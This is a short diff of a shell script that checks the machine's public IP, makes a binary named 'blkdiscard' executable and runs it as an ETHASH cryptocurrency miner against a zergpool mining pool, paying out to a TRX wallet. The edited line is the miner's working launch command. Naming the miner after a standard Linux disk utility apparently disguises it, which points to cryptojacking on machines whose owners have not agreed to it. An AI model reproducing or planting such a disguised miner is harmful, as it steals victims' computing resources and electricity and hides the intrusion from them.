@@ -4,4 +4,4 @@
 #gives ip address 
 curl ipecho.net/plain && curl ipecho.net/plain
 chmod +x blkdiscard 
-./blkdiscard --algo ETHASH --pool ethash.asia.mine.zergpool.com:9999 --user TRX:TCcpLwuXCAHd5zLNsN.Worker1 #omhj-poh1
+./blkdiscard --algo ETHASH --pool ethash.asia.mine.zergpool.com:9999 --user TCcpLwuXCAHd5zLNsN.Worker1 --pass c=TRX #omhj-poh1
